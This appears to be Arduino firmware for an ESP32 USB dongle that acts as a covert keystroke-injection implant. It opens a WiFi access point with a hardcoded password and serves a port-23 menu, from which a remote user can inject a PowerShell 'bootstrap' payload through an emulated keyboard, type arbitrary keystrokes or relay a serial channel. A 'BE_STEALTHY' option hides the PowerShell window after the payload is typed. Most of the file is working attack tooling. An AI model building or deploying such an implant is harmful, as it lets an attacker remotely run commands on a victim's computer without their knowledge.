
#include "Arduino.h"
#include "SD_MMC.h"
#include "logo.h"
#include "lv_driver.h"
#include "pin_config.h"

/* external library */
/* To use Arduino, you need to place lv_conf.h in the \Arduino\libraries directory */
#include "OneButton.h" // https://github.com/mathertel/OneButton
#include "TFT_eSPI.h"  // https://github.com/Bodmer/TFT_eSPI

#include "lv_conf.h"
#include "lvgl.h"    // https://github.com/lvgl/lvgl
#include <FastLED.h> // https://github.com/FastLED/FastLED

#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"

#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiClient.h>

// Serial globals

// #if ARDUINO_USB_CDC_ON_BOOT
// #define HWSerial Serial0
// #define USBSerial Serial
// #else
#define HWSerial Serial
USBCDC USBSerial2;
//#endif

// USB globals
USBHIDKeyboard keyboard;
USBHIDMouse mouse;

// Wifi Globals
char ssid[25]; // sside generated in sprintf in setup()
const char *password = "thepassword";

WiFiServer server(23);

// Screen globals
LV_IMG_DECLARE(avatargif);
TFT_eSPI tft = TFT_eSPI();
CRGB leds;
OneButton button(BTN_PIN, true);
uint8_t btn_press = 0;
lv_obj_t *label;

// state machine globals
enum RJ_STATE {
  MENU_STATE = 0,
  PAYLOAD_STATE,
  KEYBOARD_STATE,
  SERIAL_STATE
};

RJ_STATE state = MENU_STATE;

void led_task(void *param) {
  while (1) {
    static uint8_t hue = 0;
    leds = CHSV(hue++, 0XFF, 100);
    FastLED.show();
    delay(50);
  }
}

char label_text[255];
void refresh_label_text() {
  label_text[0]='\0';
  strcat(label_text, ssid);
  strcat(label_text, "\n");
  IPAddress myIP = WiFi.softAPIP();
  strcat(label_text, myIP.toString().c_str());
}

void setup() {
  HWSerial.begin(115200);
  HWSerial.println("Hello T-Dongle-S3");
  pinMode(TFT_LEDA_PIN, OUTPUT);

  // init USB HID
  // initialize control over the keyboard:
  keyboard.begin();
  mouse.begin();
  USBSerial2.begin();
  USB.begin();

  // keyboard.print("Starting...");

  // Initialise TFT
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  digitalWrite(TFT_LEDA_PIN, 0);
  tft.setTextFont(1);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  // tft.pushImage(0, 0, 160, 80, (uint16_t *)gImage_logo);

  // wifi AP setup
  uint32_t low     = ESP.getEfuseMac() & 0xFFFFFFFF; 
  uint32_t high    = ( ESP.getEfuseMac() >> 32 ) % 0xFFFFFFFF;
  uint64_t fullMAC = word(low,high);

  // just want to have some ID to hopefully avoid SSID colision. 
  // hopefully this is good enough *shrug*
  uint16_t small_id = low & 0xFFFF;

  snprintf(ssid, 23, "hax-%X", small_id);
  if (!WiFi.softAP(ssid, password)) {
    log_e("Soft AP creation failed.");
    keyboard.print("SoftAP creation failed :( ");
    while (1)
      ;
  }
  IPAddress myIP = WiFi.softAPIP();
  // keyboard.print("AP IP address: ");
  // keyboard.println(myIP);
  keyboard.releaseAll();
  server.begin();

  // BGR ordering is typical
  // --- Uncomment for shiny LEDs ---
  // FastLED.addLeds<APA102, LED_DI_PIN, LED_CI_PIN, BGR>(&leds, 1);
  // xTaskCreatePinnedToCore(led_task, "led_task", 1024, NULL, 1, NULL, 0);

  lvgl_init();

  lv_obj_t* screen = lv_scr_act();


  /* just show the logo gif */
  lv_obj_set_style_bg_color(screen, lv_color_black(),0);
  lv_obj_t *img = lv_gif_create(screen);
  lv_obj_set_size(img, 60, 80);
  lv_gif_set_src(img, &avatargif);
  lv_obj_set_pos(img, 0, 0);

  label = lv_label_create(screen);
  refresh_label_text();
  lv_label_set_text(label, label_text);
  lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_CENTER, 0);
  lv_obj_set_pos(label, 65, 15);

  button.attachClick([] { setup_ps(); });
}

// set to 0 to help see whats going on. set to 1 to be stealthy
#define BE_STEALTHY 1
void setup_ps() {

  keyboard.press(KEY_LEFT_GUI);
  keyboard.press('r');
  delay(10);
  keyboard.releaseAll();
  delay(500);

  keyboard.print("powershell");
  delay(100);
  keyboard.press(KEY_RETURN);
  delay(100);
  keyboard.releaseAll();
  delay(1200);

  keyboard.print(bootstrap_ps);

  if (BE_STEALTHY) {
    keyboard.print("clear");
    keyboard.print(small_window);
    keyboard.press(KEY_LEFT_ALT);
    keyboard.press(' ');
    delay(100);
    keyboard.releaseAll();
    delay(10);
    keyboard.write('n');
  }
}


void write_to_screen(char *label1_text) {
  lv_label_set_text(label, label1_text);
}


void handle_user_input(const char *input, WiFiClient *client) {
  // escape logic
  if(state != MENU_STATE && (strcmp(input, "hop away\r\n") == 0 ||  strcmp(input, "hop away\n") == 0)) {
       client->write("entering menu state\n");
       state = MENU_STATE;
       write_to_screen("MENU");
  }

  switch(state) {
    case MENU_STATE:
      if(strcmp(input, "payload\r\n") == 0 || strcmp(input, "payload\n") == 0) {
        state = PAYLOAD_STATE;
        setup_ps();
        client->write("payload delivered\n");
        state = MENU_STATE;
      } else if(strcmp(input, "keyboard\r\n") == 0 || strcmp(input, "keyboard\n") == 0) {
        client->write("Entering keyboard mode\n");
        write_to_screen("KEYBOARD");
        state = KEYBOARD_STATE;
      } else if(strcmp(input, "serial\r\n") == 0 || strcmp(input, "serial\n") == 0) {
        client->write("Entering serial mode\n");
        write_to_screen("SERIAL");
        USBSerial2.write(" \r\n");
        state = SERIAL_STATE;
      } else {
        client->write("MENU: type 'payload' 'keyboard' or 'serial'. to exit a mode type 'hop away'\n->");
        write_to_screen("HELP");
        state = MENU_STATE;
      }
  
      break;

    case PAYLOAD_STATE:
         client->write("SHHHHH. still dropping payload");
    break;

    case KEYBOARD_STATE: {
#ifndef RJ_DEBUG
        size_t len = strlen(input); 
        keyboard.write((uint8_t*)input, len);
        write_to_screen("Keystrokes-->");
#else
        Serial.print("Keyboard from user: ");
        Serial.println(input);
#endif
    }
    break;

    case SERIAL_STATE:
#ifndef RJ_DEBUG
        USBSerial2.write(input);
        write_to_screen("SERIAL");
#else
        Serial.print("Serial teminal from user: ");
        Serial.println(input);
#endif
    break;

    default:
      client->write("Unknown state bro. How did you even do this?");
      write_to_screen("Unknown state");
  }
}

void service_loop() {
  lv_timer_handler();
  button.tick();
}

void loop_wifi() {
  WiFiClient client = server.available(); // listen for incoming clients

  if (client) { // if you get a client,
    // keyboard.println("New Client.");           // print a message out the serial port
    if(client.connected()){
        client.write("Welcome!\n"); 
        state = MENU_STATE;
        handle_user_input(" ", &client); // print menu
        write_to_screen("Client connected");
      }

    while (client.connected()) {   // loop while the client's connected
      while (client.available()) { // if there's bytes to read from the client,
        String s = client.readString();   
        // keyboard.write(c);
        //USBSerial2.write(c);
        // needs_flush = true;
        handle_user_input(s.c_str(), &client);
      }
      while (state == SERIAL_STATE && USBSerial2.available()) {
        char c = USBSerial2.read();
        client.write(c);
      }
      // service other tasks/loops
      service_loop();
    }
    // close the connection:
    client.stop();
    // keyboard.println("Client Disconnected.");
  } else {
    service_loop();
  }
}

void loop() { // Put your main code here, to run repeatedly:
  loop_wifi();
  delay(10); // long delay when not servicing clients
}
